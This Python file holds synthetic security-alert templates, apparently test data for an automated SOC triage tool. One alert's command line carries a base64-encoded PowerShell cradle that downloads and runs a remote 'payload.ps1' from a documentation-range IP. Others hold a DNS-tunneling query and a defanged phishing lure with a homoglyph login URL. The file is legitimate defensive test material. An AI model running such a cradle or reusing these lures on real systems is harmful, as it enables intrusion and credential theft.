"""
Synthetic / defanged telemetry templates for the Autonomous Tier-1 SOC Analyst.
All indicators are RFC 5737 / documentation ranges or deliberately defanged.
"""

from typing import Dict, Any, List

# ---------------------------------------------------------------------------
# Alert Templates
# ---------------------------------------------------------------------------

ALERTS: Dict[str, Dict[str, Any]] = {

    # ------------------------------------------------------------------
    # a) TRUE POSITIVE – High/Critical EDR (Encoded PowerShell → C2)
    # ------------------------------------------------------------------
    "tp_edr_powershell_c2": {
        "alert_id": "EDR-20260926-004821",
        "source": "CrowdStrike Falcon",
        "severity": "Critical",
        "category": "Malware / Command & Control",
        "timestamp": "2026-09-26T08:14:33Z",
        "asset": {
            "hostname": "WKSTN-FIN-042",
            "ip": "10.32.18.91",
            "os": "Windows 11 Enterprise",
            "criticality": "High",
            "owner": "finance.ops",
            "department": "Finance"
        },
        "user": {
            "sam_account": "j.doe",
            "upn": "j.doe@contoso.example",
            "role": "Standard User"
        },
        "detection": {
            "technique": "T1059.001 – PowerShell",
            "tactic": "Execution / Command and Control",
            "description": "Encoded PowerShell download cradle observed. Process spawned from Outlook → powershell.exe -enc <base64>. Outbound connection to external IP.",
            "process": {
                "name": "powershell.exe",
                "cmdline": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIANAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
                "parent": "OUTLOOK.EXE",
                "pid": 4821
            },
            "network": {
                "dst_ip": "198.51.100.24",
                "dst_port": 443,
                "protocol": "HTTPS",
                "bytes_out": 18432
            },
            "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"  # defanged test
        },
        "raw_json": {}  # populated at runtime if needed
    },

    # ------------------------------------------------------------------
    # b) FALSE POSITIVE – Low severity AV heuristic on developer build
    # ------------------------------------------------------------------
    "fp_av_dev_build": {
        "alert_id": "AV-20260926-001107",
        "source": "Microsoft Defender for Endpoint",
        "severity": "Low",
        "category": "Heuristic / PUA",
        "timestamp": "2026-09-26T11:02:17Z",
        "asset": {
            "hostname": "DEV-BUILD-07",
            "ip": "10.40.5.22",
            "os": "Windows 11 Pro",
            "criticality": "Low",
            "owner": "eng.build",
            "department": "Engineering"
        },
        "user": {
            "sam_account": "a.chen",
            "upn": "a.chen@contoso.example",
            "role": "Software Engineer"
        },
        "detection": {
            "technique": "T1204 – User Execution (false positive)",
            "tactic": "Execution",
            "description": "Generic heuristic detection on unsigned binary produced by internal CI pipeline (contoso-build-artifact.exe).",
            "process": {
                "name": "contoso-build-artifact.exe",
                "cmdline": "C:\\Users\\a.chen\\source\\repos\\ci-out\\contoso-build-artifact.exe --test",
                "parent": "cmd.exe",
                "pid": 1107
            },
            "file_hash": "a1b2c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef",
            "signature_status": "Unsigned (internal developer certificate)"
        }
    },

    # ------------------------------------------------------------------
    # c) HIGH SEVERITY – DNS Tunneling / High-entropy exfiltration
    # ------------------------------------------------------------------
    "high_dns_tunnel": {
        "alert_id": "DNS-20260926-009344",
        "source": "BlueCat DNS / DDI",
        "severity": "High",
        "category": "Exfiltration / Command & Control",
        "timestamp": "2026-09-26T09:47:55Z",
        "asset": {
            "hostname": "SRV-DB-PROD-03",
            "ip": "10.50.12.8",
            "os": "Windows Server 2022",
            "criticality": "Critical",
            "owner": "dba.team",
            "department": "Infrastructure"
        },
        "user": {
            "sam_account": "svc_backup",
            "upn": "svc_backup@contoso.example",
            "role": "Service Account"
        },
        "detection": {
            "technique": "T1048.003 – Exfiltration Over Alternative Protocol (DNS)",
            "tactic": "Exfiltration / Command and Control",
            "description": "High-entropy subdomain queries consistent with DNS tunneling. Query volume and NXDOMAIN ratio elevated.",
            "dns": {
                "query": "x9f2k8m3p7q1.r4s6t0u2v5.example[.]com",
                "qtype": "TXT",
                "response_code": "NOERROR",
                "entropy_score": 4.87,
                "query_count_5min": 412,
                "nxdomain_ratio": 0.31
            },
            "dst_domain": "example[.]com"
        }
    },

    # ------------------------------------------------------------------
    # d) EXPLAINED ANOMALY – Off-hours privileged PowerShell + Change Ticket
    # ------------------------------------------------------------------
    "benign_change_request": {
        "alert_id": "EDR-20260926-007219",
        "source": "CrowdStrike Falcon",
        "severity": "Medium",
        "category": "Suspicious PowerShell / Privilege Use",
        "timestamp": "2026-09-26T02:18:44Z",  # off-hours
        "asset": {
            "hostname": "SRV-APP-PROD-11",
            "ip": "10.60.3.45",
            "os": "Windows Server 2019",
            "criticality": "High",
            "owner": "app.ops",
            "department": "Application Operations"
        },
        "user": {
            "sam_account": "m.patel",
            "upn": "m.patel@contoso.example",
            "role": "Senior Systems Administrator"
        },
        "detection": {
            "technique": "T1059.001 – PowerShell",
            "tactic": "Execution",
            "description": "Privileged PowerShell backup utility executed outside business hours. Command invokes approved backup module.",
            "process": {
                "name": "powershell.exe",
                "cmdline": "powershell.exe -File C:\\Scripts\\Approved\\Backup-ProdDB.ps1 -Server SRV-APP-PROD-11 -Retention 7",
                "parent": "services.exe",
                "pid": 7219
            },
            "change_ticket_hint": "CHG0039102"
        }
    },

    # ------------------------------------------------------------------
    # e) PHISHING – Executive spoof + homoglyph URL + weaponized ZIP
    # ------------------------------------------------------------------
    "phishing_ceo_spoof": {
        "alert_id": "EML-20260926-003388",
        "source": "Proofpoint / Microsoft Defender for Office 365",
        "severity": "High",
        "category": "Phishing / Credential Harvesting",
        "timestamp": "2026-09-26T07:33:12Z",
        "mailbox": {
            "address": "cfo@contoso.example",
            "display_name": "Chief Financial Officer",
            "department": "Finance"
        },
        "user": {
            "sam_account": "cfo",
            "upn": "cfo@contoso.example",
            "role": "Executive"
        },
        "detection": {
            "technique": "T1566.002 – Spearphishing Link",
            "tactic": "Initial Access",
            "description": "Inbound message spoofing CEO requesting urgent payroll update. Fails SPF/DKIM. Contains homoglyph URL and encrypted ZIP.",
            "email": {
                "from": "ceo@contoso.example",          # spoofed
                "reply_to": "ceo.payroll@mail-secure[.]xyz",
                "subject": "URGENT: Q3 Payroll Adjustment – Action Required",
                "headers": {
                    "Authentication-Results": "spf=fail (sender IP is 203.0.113.55) smtp.mailfrom=contoso.example; dkim=fail; dmarc=fail",
                    "Received-SPF": "Fail",
                    "X-Proofpoint-Spam-Details": "rule=phish_medium policy=default score=0"
                },
                "urls": [
                    "https://login-micros0ft[.]com/sso/payroll-update"
                ],
                "attachment": {
                    "filename": "Payroll_Update_Q3.zip",
                    "sha256": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
                    "encrypted": True,
                    "password_hint": "payroll2026"
                }
            }
        }
    }
}


def get_alert(alert_key: str) -> Dict[str, Any]:
    """Return a deep copy of the requested synthetic alert."""
    import copy
    if alert_key not in ALERTS:
        raise KeyError(f"Unknown alert key: {alert_key}")
    return copy.deepcopy(ALERTS[alert_key])


def list_alert_keys() -> List[str]:
    return list(ALERTS.keys())


def get_alert_display_name(key: str) -> str:
    names = {
        "tp_edr_powershell_c2": "🔴 True Positive – Encoded PowerShell → C2 (EDR)",
        "fp_av_dev_build": "🟢 False Positive – AV Heuristic on Dev Build",
        "high_dns_tunnel": "🟠 High Severity – DNS Tunneling Exfiltration",
        "benign_change_request": "🔵 Explained Anomaly – Authorized Change (CHG0039102)",
        "phishing_ceo_spoof": "🔴 Phishing – CEO Spoof + Homoglyph + Weaponized ZIP"
    }
    return names.get(key, key)